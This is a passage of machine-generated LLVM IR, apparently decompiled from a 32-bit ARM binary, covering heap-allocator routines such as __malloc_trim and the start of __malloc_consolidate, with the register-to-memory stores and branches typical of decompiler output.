  br i1 %v3_12414, label %dec_label_pc_12424, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %dec_label_pc_12408
  store i32 %v0_12424, i32* @r1, align 4
  %v0_1241c = call i32 @memcpy()
  store i32 %v0_1241c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12424:                               ; preds = %dec_label_pc_12408
  %v1_12424 = inttoptr i32 %v0_12424 to i32*
  %v2_12424 = load i32, i32* %v1_12424, align 4
  store i32 %v2_12424, i32* %r3.global-to-local, align 4
  %v2_12428 = inttoptr i32 %v0_123e0 to i32*
  store i32 %v2_12424, i32* %v2_12428, align 4
  %v0_1242c = load i32, i32* @r5, align 4
  %v1_1242c = add i32 %v0_1242c, 4
  %v2_1242c = inttoptr i32 %v1_1242c to i32*
  %v3_1242c = load i32, i32* %v2_1242c, align 4
  store i32 %v3_1242c, i32* %r3.global-to-local, align 4
  %v1_12430 = load i32, i32* %r1.global-to-local, align 4
  %v2_12430 = add i32 %v1_12430, 4
  %v3_12430 = inttoptr i32 %v2_12430 to i32*
  store i32 %v3_1242c, i32* %v3_12430, align 4
  %v0_12434 = load i32, i32* @r5, align 4
  %v1_12434 = add i32 %v0_12434, 8
  %v2_12434 = inttoptr i32 %v1_12434 to i32*
  %v3_12434 = load i32, i32* %v2_12434, align 4
  store i32 %v3_12434, i32* %r3.global-to-local, align 4
  %v0_12438 = load i32, i32* @ip, align 4
  %v1_1243c = load i32, i32* %r1.global-to-local, align 4
  %v2_1243c = add i32 %v1_1243c, 8
  %v3_1243c = inttoptr i32 %v2_1243c to i32*
  store i32 %v3_12434, i32* %v3_1243c, align 4
  %tmp39 = icmp ult i32 %v0_12438, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12444

dec_label_pc_12444:                               ; preds = %dec_label_pc_12424
  %v0_12444 = load i32, i32* @r5, align 4
  %v1_12444 = add i32 %v0_12444, 12
  %v2_12444 = inttoptr i32 %v1_12444 to i32*
  %v3_12444 = load i32, i32* %v2_12444, align 4
  store i32 %v3_12444, i32* %r3.global-to-local, align 4
  %v1_12448 = load i32, i32* %r1.global-to-local, align 4
  %v2_12448 = add i32 %v1_12448, 12
  %v3_12448 = inttoptr i32 %v2_12448 to i32*
  store i32 %v3_12444, i32* %v3_12448, align 4
  %v0_1244c = load i32, i32* @r5, align 4
  %v1_1244c = add i32 %v0_1244c, 16
  %v2_1244c = inttoptr i32 %v1_1244c to i32*
  %v3_1244c = load i32, i32* %v2_1244c, align 4
  store i32 %v3_1244c, i32* %r3.global-to-local, align 4
  %v0_12450 = load i32, i32* @ip, align 4
  %v1_12454 = load i32, i32* %r1.global-to-local, align 4
  %v2_12454 = add i32 %v1_12454, 16
  %v3_12454 = inttoptr i32 %v2_12454 to i32*
  store i32 %v3_1244c, i32* %v3_12454, align 4
  %tmp40 = icmp ult i32 %v0_12450, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1245c

dec_label_pc_1245c:                               ; preds = %dec_label_pc_12444
  %v0_1245c = load i32, i32* @r5, align 4
  %v1_1245c = add i32 %v0_1245c, 20
  %v2_1245c = inttoptr i32 %v1_1245c to i32*
  %v3_1245c = load i32, i32* %v2_1245c, align 4
  store i32 %v3_1245c, i32* %r3.global-to-local, align 4
  %v1_12460 = load i32, i32* %r1.global-to-local, align 4
  %v2_12460 = add i32 %v1_12460, 20
  %v3_12460 = inttoptr i32 %v2_12460 to i32*
  store i32 %v3_1245c, i32* %v3_12460, align 4
  %v0_12464 = load i32, i32* @r5, align 4
  %v1_12464 = add i32 %v0_12464, 24
  %v2_12464 = inttoptr i32 %v1_12464 to i32*
  %v3_12464 = load i32, i32* %v2_12464, align 4
  store i32 %v3_12464, i32* %r3.global-to-local, align 4
  %v1_12468 = load i32, i32* %r1.global-to-local, align 4
  %v2_12468 = add i32 %v1_12468, 24
  %v3_12468 = inttoptr i32 %v2_12468 to i32*
  store i32 %v3_12464, i32* %v3_12468, align 4
  %v0_1246c = load i32, i32* @ip, align 4
  %v7_1246c = icmp eq i32 %v0_1246c, 9
  br i1 %v7_1246c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1245c
  %v1_12470 = load i32, i32* @r5, align 4
  %v2_12470 = add i32 %v1_12470, 28
  %v3_12470 = inttoptr i32 %v2_12470 to i32*
  %v4_12470 = load i32, i32* %v3_12470, align 4
  store i32 %v4_12470, i32* %r3.global-to-local, align 4
  %v2_12474 = load i32, i32* %r1.global-to-local, align 4
  %v3_12474 = add i32 %v2_12474, 28
  %v4_12474 = inttoptr i32 %v3_12474 to i32*
  store i32 %v4_12470, i32* %v4_12474, align 4
  %v1_12478 = load i32, i32* @r5, align 4
  %v2_12478 = add i32 %v1_12478, 32
  %v3_12478 = inttoptr i32 %v2_12478 to i32*
  %v4_12478 = load i32, i32* %v3_12478, align 4
  store i32 %v4_12478, i32* %r3.global-to-local, align 4
  %v2_1247c = load i32, i32* %r1.global-to-local, align 4
  %v3_1247c = add i32 %v2_1247c, 32
  %v4_1247c = inttoptr i32 %v3_1247c to i32*
  store i32 %v4_12478, i32* %v4_1247c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1245c, %dec_label_pc_12444, %dec_label_pc_12424, %dec_label_pc_12418, %bb32
  %v0_12480 = load i32, i32* @r5, align 4
  store i32 %v0_12480, i32* @r0, align 4
  %v0_12484 = call i32 @free()
  store i32 %v0_12484, i32* %r0.global-to-local, align 4
  %v0_12488 = load i32, i32* @r7, align 4
  %v1_12488 = add i32 %v0_12488, 8
  store i32 %v1_12488, i32* @r4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_12490:                               ; preds = %bb30, %.thread2, %dec_label_pc_123d0
  %v0_124a4 = phi i32 [ %v3_12400, %.thread2 ], [ %v1_12318, %bb30 ], [ %v1_12490.pre, %dec_label_pc_123d0 ]
  %v0_12490 = load i32, i32* @sb, align 4
  %v2_12490 = sub i32 %v0_124a4, %v0_12490
  store i32 %v2_12490, i32* %r1.global-to-local, align 4
  %v0_12498 = load i32, i32* @sl, align 4
  %v1_12498 = add i32 %v0_12498, 4
  %v2_12498 = inttoptr i32 %v1_12498 to i32*
  %v3_12498 = load i32, i32* %v2_12498, align 4
  %tmp41 = icmp ugt i32 %v2_12490, 15
  %v1_124c0 = urem i32 %v3_12498, 2
  store i32 %v1_124c0, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_124c0, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_12490
  %v2_124a4 = or i32 %v1_124c0, %v0_124a4
  store i32 %v2_124a4, i32* %r3.global-to-local, align 4
  store i32 %v2_124a4, i32* %v2_12498, align 4
  %v0_124ac = load i32, i32* @sl, align 4
  %v1_124ac = load i32, i32* %r0.global-to-local, align 4
  %v2_124ac = add i32 %v1_124ac, %v0_124ac
  store i32 %v2_124ac, i32* %r2.global-to-local, align 4
  %v1_124b0 = add i32 %v2_124ac, 4
  %v2_124b0 = inttoptr i32 %v1_124b0 to i32*
  %v3_124b0 = load i32, i32* %v2_124b0, align 4
  %v1_124b4 = or i32 %v3_124b0, 1
  store i32 %v1_124b4, i32* %r3.global-to-local, align 4
  store i32 %v1_124b4, i32* %v2_124b0, align 4
  br label %dec_label_pc_124f0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_12490
  %v2_124c4 = add i32 %v0_12498, %v0_12490
  store i32 %v2_124c4, i32* %r0.global-to-local, align 4
  %v2_124c8 = or i32 %v1_124c0, %v0_12490
  store i32 %v2_124c8, i32* %r3.global-to-local, align 4
  %v1_124cc = or i32 %v2_12490, 1
  store i32 %v1_124cc, i32* %r2.global-to-local, align 4
  store i32 %v2_124c8, i32* %v2_12498, align 4
  %v0_124d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_124d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_124d4 = add i32 %v1_124d4, 4
  %v3_124d4 = inttoptr i32 %v2_124d4 to i32*
  store i32 %v0_124d4, i32* %v3_124d4, align 4
  %v0_124d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_124d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_124d8 = add i32 %v1_124d8, %v0_124d8
  store i32 %v2_124d8, i32* %r2.global-to-local, align 4
  %v1_124dc = add i32 %v2_124d8, 4
  %v2_124dc = inttoptr i32 %v1_124dc to i32*
  %v3_124dc = load i32, i32* %v2_124dc, align 4
  %v1_124e0 = or i32 %v3_124dc, 1
  store i32 %v1_124e0, i32* %r3.global-to-local, align 4
  store i32 %v1_124e0, i32* %v2_124dc, align 4
  %v0_124e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_124e8 = add i32 %v0_124e8, 8
  store i32 %v1_124e8, i32* @r0, align 4
  %v0_124ec = call i32 @free()
  store i32 %v0_124ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124f0

dec_label_pc_124f0:                               ; preds = %dec_label_pc_124a0, %dec_label_pc_124c0
  %v0_124f0 = load i32, i32* @sl, align 4
  %v1_124f0 = add i32 %v0_124f0, 8
  store i32 %v1_124f0, i32* @r4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_124f8:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_12500 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_12500, i32* @r8, align 4
  %v2_12504 = inttoptr i32 %v1_12314 to i32*
  %v3_12504 = load i32, i32* %v2_12504, align 4
  store i32 %v3_12504, i32* @r4, align 4
  %v1_12508 = add i32 %v4_12500, 860
  %v2_12508 = inttoptr i32 %v1_12508 to i32*
  %v3_12508 = load i32, i32* %v2_12508, align 4
  %v1_1250c = add i32 %v3_12504, 4
  %v1_12510 = add i32 %v3_12508, -1
  store i32 %v1_12510, i32* %r2.global-to-local, align 4
  %v2_12514 = add i32 %v1_1250c, %v1_12510
  %v1_12518 = load i32, i32* @sb, align 4
  %v2_12518 = add i32 %v2_12514, %v1_12518
  store i32 %v2_12518, i32* %r3.global-to-local, align 4
  %v2_1251c = sub i32 0, %v3_12508
  %v3_1251c = and i32 %v2_12518, %v2_1251c
  store i32 %v3_1251c, i32* @r7, align 4
  %v2_12520 = sub i32 %v3_1251c, %v3_12504
  store i32 %v2_12520, i32* @fp, align 4
  %v9_12524 = icmp eq i32 %v1_12318, %v2_12520
  br i1 %v9_12524, label %dec_label_pc_12598, label %dec_label_pc_1252c

dec_label_pc_1252c:                               ; preds = %dec_label_pc_124f8
  %v2_1252c = sub i32 %v1_12314, %v3_12504
  store i32 %v2_1252c, i32* %r0.global-to-local, align 4
  %v2_12530 = add i32 %v3_12504, %v1_12318
  store i32 %v2_12530, i32* %r1.global-to-local, align 4
  store i32 %v3_1251c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1253c = call i32 @mremap(i32 %v2_1252c, i32 %v2_12530, i32 %v3_1251c, i32 1)
  store i32 %v4_1253c, i32* %r0.global-to-local, align 4
  %v7_12540 = icmp eq i32 %v4_1253c, -1
  br i1 %v7_12540, label %dec_label_pc_1258c, label %dec_label_pc_12548

dec_label_pc_12548:                               ; preds = %dec_label_pc_1252c
  %v1_12548 = load i32, i32* @r4, align 4
  %v2_12548 = add i32 %v1_12548, %v4_1253c
  store i32 %v2_12548, i32* %r0.global-to-local, align 4
  %v0_1254c = load i32, i32* @fp, align 4
  %v1_1254c = or i32 %v0_1254c, 2
  store i32 %v1_1254c, i32* %r3.global-to-local, align 4
  %v2_12550 = add i32 %v2_12548, 4
  %v3_12550 = inttoptr i32 %v2_12550 to i32*
  store i32 %v1_1254c, i32* %v3_12550, align 4
  %v0_12554 = load i32, i32* @r8, align 4
  %v1_12554 = add i32 %v0_12554, 868
  %v2_12554 = inttoptr i32 %v1_12554 to i32*
  %v3_12554 = load i32, i32* %v2_12554, align 4
  store i32 %v3_12554, i32* %r3.global-to-local, align 4
  %v1_12558 = add i32 %v0_12554, 880
  %v2_12558 = inttoptr i32 %v1_12558 to i32*
  %v3_12558 = load i32, i32* %v2_12558, align 4
  store i32 %v3_12558, i32* %r2.global-to-local, align 4
  %v0_1255c = load i32, i32* @r6, align 4
  %v2_1255c = sub i32 %v3_12554, %v0_1255c
  store i32 %v2_1255c, i32* %r3.global-to-local, align 4
  %v1_12560 = load i32, i32* @r7, align 4
  %v2_12560 = add i32 %v1_12560, %v2_1255c
  store i32 %v2_12560, i32* %r1.global-to-local, align 4
  %v1_12564 = add i32 %v0_12554, 872
  %v2_12564 = inttoptr i32 %v1_12564 to i32*
  %v3_12564 = load i32, i32* %v2_12564, align 4
  store i32 %v3_12564, i32* %r3.global-to-local, align 4
  %v1_1256c = add i32 %v0_12554, 884
  %v2_1256c = inttoptr i32 %v1_1256c to i32*
  %v3_1256c = load i32, i32* %v2_1256c, align 4
  store i32 %v3_1256c, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12560, %v3_12558
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12548
  store i32 %v2_12560, i32* %v2_12558, align 4
  %v0_12574.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12574.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12548, %bb33
  %v1_12574 = phi i32 [ %v0_12554, %dec_label_pc_12548 ], [ %v1_12574.pre, %bb33 ]
  %v0_12574 = phi i32 [ %v2_12560, %dec_label_pc_12548 ], [ %v0_12574.pre, %bb33 ]
  %v2_12574 = add i32 %v1_12574, 868
  %v3_12574 = inttoptr i32 %v2_12574 to i32*
  store i32 %v0_12574, i32* %v3_12574, align 4
  %v0_12578 = load i32, i32* %r1.global-to-local, align 4
  %v1_12578 = load i32, i32* %r3.global-to-local, align 4
  %v2_12578 = add i32 %v1_12578, %v0_12578
  store i32 %v2_12578, i32* %r1.global-to-local, align 4
  %v1_1257c = load i32, i32* %r2.global-to-local, align 4
  %v0_12580 = load i32, i32* %r0.global-to-local, align 4
  %v1_12580 = add i32 %v0_12580, 8
  store i32 %v1_12580, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12578, %v1_1257c
  br i1 %tmp43, label %bb35, label %dec_label_pc_125c4

bb35:                                             ; preds = %bb34
  %v5_12584 = load i32, i32* @r8, align 4
  %v6_12584 = add i32 %v5_12584, 884
  %v7_12584 = inttoptr i32 %v6_12584 to i32*
  store i32 %v2_12578, i32* %v7_12584, align 4
  br label %dec_label_pc_125c4

dec_label_pc_1258c:                               ; preds = %dec_label_pc_1252c
  %v0_1258c = load i32, i32* @sb, align 4
  %v1_1258c = add i32 %v0_1258c, 4
  store i32 %v1_1258c, i32* %r3.global-to-local, align 4
  %v0_12590 = load i32, i32* @r6, align 4
  %v3_12590 = icmp ult i32 %v0_12590, %v1_1258c
  br i1 %v3_12590, label %dec_label_pc_125a0, label %dec_label_pc_1258c.dec_label_pc_12598_crit_edge

dec_label_pc_1258c.dec_label_pc_12598_crit_edge:  ; preds = %dec_label_pc_1258c
  %v0_12598.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_1258c.dec_label_pc_12598_crit_edge, %dec_label_pc_124f8
  %v0_12598 = phi i32 [ %v0_12598.pre, %dec_label_pc_1258c.dec_label_pc_12598_crit_edge ], [ %v0_12300, %dec_label_pc_124f8 ]
  store i32 %v0_12598, i32* @r4, align 4
  br label %dec_label_pc_125c4

dec_label_pc_125a0:                               ; preds = %dec_label_pc_1258c
  %v1_125a0 = add i32 %v0_1258c, -7
  store i32 %v1_125a0, i32* @r0, align 4
  %v0_125a4 = call i32 @malloc()
  store i32 %v0_125a4, i32* @r0, align 4
  store i32 %v0_125a4, i32* @r4, align 4
  %v2_125a8 = icmp eq i32 %v0_125a4, 0
  br i1 %v2_125a8, label %dec_label_pc_125c4, label %dec_label_pc_125b0

dec_label_pc_125b0:                               ; preds = %dec_label_pc_125a0
  %v0_125b0 = load i32, i32* @r6, align 4
  %v1_125b0 = add i32 %v0_125b0, -8
  store i32 %v1_125b0, i32* @r2, align 4
  %v0_125b4 = load i32, i32* @r5, align 4
  store i32 %v0_125b4, i32* @r1, align 4
  %v0_125b8 = call i32 @memcpy()
  %v0_125bc = load i32, i32* @r5, align 4
  store i32 %v0_125bc, i32* @r0, align 4
  %v0_125c0 = call i32 @free()
  store i32 %v0_125c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_125a0, %dec_label_pc_12598, %dec_label_pc_124f0, %.thread6, %dec_label_pc_12360, %dec_label_pc_125b0
  store i32 %v2_122ac, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v4_125d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_125d4)
  br label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_122e0, %dec_label_pc_12288, %dec_label_pc_12270, %dec_label_pc_125c4
  %v0_125e0 = load i32, i32* @r4, align 4
  store i32 %v0_125e0, i32* %r0.global-to-local, align 4
  store i32 %v3_12250, i32* @r4, align 4
  store i32 %v6_12250, i32* @r5, align 4
  store i32 %v9_12250, i32* @r6, align 4
  store i32 %v12_12250, i32* @r7, align 4
  store i32 %v15_12250, i32* @r8, align 4
  store i32 %v18_12250, i32* @sb, align 4
  store i32 %v21_12250, i32* @sl, align 4
  store i32 %v24_12250, i32* @fp, align 4
  store i32 %v27_12250, i32* @lr, align 4
  ret i32 %v0_125e0

; uselistorder directives
  uselistorder i32 %v2_12578, { 1, 0, 2 }
  uselistorder i32 %v2_12560, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1253c, { 1, 0, 2 }
  uselistorder i32 %v3_1251c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_124c0, { 2, 1, 0 }
  uselistorder i32 %v2_12490, { 1, 0, 2 }
  uselistorder i32 %v0_12424, { 1, 0 }
  uselistorder i32 %v0_123e0, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12344, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1233c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12320, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12318, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12314, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12304, { 1, 0 }
  uselistorder i32 %v0_12300, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_122d8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_125e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_125c4, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_124f0, { 1, 0 }
  uselistorder label %dec_label_pc_12490, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_123dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_123d0, { 1, 0 }
  uselistorder label %dec_label_pc_123cc, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_125f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_125f4:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_125f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_125f4, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_125f4
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_12608.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12608.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_1260c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_125f4, %bb
  %v4_1260c = phi i32 [ %v4_1260c.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_125f4 ], [ 0, %bb ]
  ret i32 %v4_1260c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12610 = add i32 %arg2, 44
  %v2_12610 = inttoptr i32 %v1_12610 to i32*
  %v3_12610 = load i32, i32* %v2_12610, align 4
  %v3_12614 = load i32, i32* @r4, align 4
  store i32 %v3_12614, i32* %stack_var_-20, align 4
  %v12_12614 = load i32, i32* @r7, align 4
  %v1_12618 = add i32 %v3_12610, 4
  %v2_12618 = inttoptr i32 %v1_12618 to i32*
  %v3_12618 = load i32, i32* %v2_12618, align 4
  %v1_1261c = add i32 %arg2, 860
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 %v3_1261c, i32* @r4, align 4
  %v1_12620 = and i32 %v3_12618, -4
  store i32 %v1_12620, i32* @r6, align 4
  %v1_12624 = add i32 %v1_12620, -17
  %v2_12628 = add i32 %v1_12624, %v3_1261c
  store i32 %arg2, i32* @r5, align 4
  %v2_12634 = sub i32 %v2_12628, %arg1
  store i32 %v3_1261c, i32* %r1.global-to-local, align 4
  %v2_1263c = udiv i32 %v2_12634, %v3_1261c
  %v1_12640 = add i32 %v2_1263c, -1
  store i32 %v1_12640, i32* %r0.global-to-local, align 4
  %v2_12644 = mul i32 %v1_12640, %v3_1261c
  store i32 %v2_12644, i32* @r7, align 4
  %v2_12648 = icmp eq i32 %v2_12644, 0
  store i1 %v2_12648, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12644, 1
  br i1 %tmp8, label %dec_label_pc_126b0, label %dec_label_pc_12650

dec_label_pc_12650:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12654 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12654, i32* %r0.global-to-local, align 4
  %v0_12658 = load i32, i32* @r5, align 4
  %v1_12658 = add i32 %v0_12658, 44
  %v2_12658 = inttoptr i32 %v1_12658 to i32*
  %v3_12658 = load i32, i32* %v2_12658, align 4
  %v0_1265c = load i32, i32* @r6, align 4
  %v2_1265c = add i32 %v0_1265c, %v3_12658
  %v9_12660 = icmp eq i32 %v1_12654, %v2_1265c
  store i1 %v9_12660, i1* @cpsr_z, align 1
  store i32 %v1_12654, i32* @r4, align 4
  br i1 %v9_12660, label %dec_label_pc_1266c, label %dec_label_pc_126b0

dec_label_pc_1266c:                               ; preds = %dec_label_pc_12650
  %v0_1266c = load i32, i32* @r7, align 4
  %v1_1266c = sub i32 0, %v0_1266c
  store i32 %v1_1266c, i32* %r0.global-to-local, align 4
  %v1_12670 = call i32 @__GI_sbrk(i32 %v1_1266c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12678 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12678, i32* %r0.global-to-local, align 4
  %v7_1267c = icmp eq i32 %v1_12678, -1
  store i1 %v7_1267c, i1* @cpsr_z, align 1
  br i1 %v7_1267c, label %dec_label_pc_126b0, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_1266c
  %v0_12684 = load i32, i32* @r4, align 4
  %v2_12684 = sub i32 %v0_12684, %v1_12678
  store i32 %v2_12684, i32* %r0.global-to-local, align 4
  %v9_12684 = icmp eq i32 %v0_12684, %v1_12678
  store i1 %v9_12684, i1* @cpsr_z, align 1
  br i1 %v9_12684, label %dec_label_pc_126b0, label %dec_label_pc_1268c

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12684
  %v0_1268c = load i32, i32* @r5, align 4
  %v1_1268c = add i32 %v0_1268c, 872
  %v2_1268c = inttoptr i32 %v1_1268c to i32*
  %v3_1268c = load i32, i32* %v2_1268c, align 4
  %v1_12690 = load i32, i32* @r6, align 4
  %v2_12690 = sub i32 %v1_12690, %v2_12684
  store i32 %v2_12690, i32* %r2.global-to-local, align 4
  %v1_12694 = add i32 %v0_1268c, 44
  %v2_12694 = inttoptr i32 %v1_12694 to i32*
  %v3_12694 = load i32, i32* %v2_12694, align 4
  store i32 %v3_12694, i32* %r1.global-to-local, align 4
  %v2_12698 = sub i32 %v3_1268c, %v2_12684
  %v1_1269c = or i32 %v2_12690, 1
  store i32 %v1_1269c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12698, i32* %v2_1268c, align 4
  %v0_126a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_126a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_126a8 = add i32 %v1_126a8, 4
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  store i32 %v0_126a8, i32* %v3_126a8, align 4
  %v1_126bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126b4

dec_label_pc_126b0:                               ; preds = %dec_label_pc_12650, %dec_label_pc_12684, %dec_label_pc_1266c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126b4

dec_label_pc_126b4:                               ; preds = %dec_label_pc_1268c, %dec_label_pc_126b0
  %v1_126bc = phi i32 [ %v1_126bc.pre, %dec_label_pc_1268c ], [ 0, %dec_label_pc_126b0 ]
  %v2_126b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_126b8, i32* @r4, align 4
  store i32 %v12_12614, i32* @r7, align 4
  ret i32 %v1_126bc

; uselistorder directives
  uselistorder i1 %v7_1267c, { 1, 0 }
  uselistorder i32 %v1_12678, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1261c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_126b4, { 1, 0 }
  uselistorder label %dec_label_pc_126b0, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_126c0 = load i32, i32* @r4, align 4
  store i32 %v3_126c0, i32* %stack_var_-36, align 4
  %v0_126c4 = load i32, i32* @r0, align 4
  %v1_126c4 = inttoptr i32 %v0_126c4 to i32*
  %v2_126c4 = load i32, i32* %v1_126c4, align 4
  store i32 %v2_126c4, i32* %r3.global-to-local, align 4
  %v2_126c8 = icmp eq i32 %v2_126c4, 0
  store i32 %v0_126c4, i32* @r4, align 4
  br i1 %v2_126c8, label %dec_label_pc_12800.preheader, label %dec_label_pc_126dc

dec_label_pc_12800.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1280825 = add i32 %v0_126c4, 52
  store i32 %v1_1280825, i32* %r3.global-to-local, align 4
  %v2_1281026 = add i32 %v0_126c4, 60
  %v3_1281027 = inttoptr i32 %v2_1281026 to i32*
  store i32 %v1_1280825, i32* %v3_1281027, align 4
  %v0_1281428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1281429 = add i32 %v0_1281428, 12
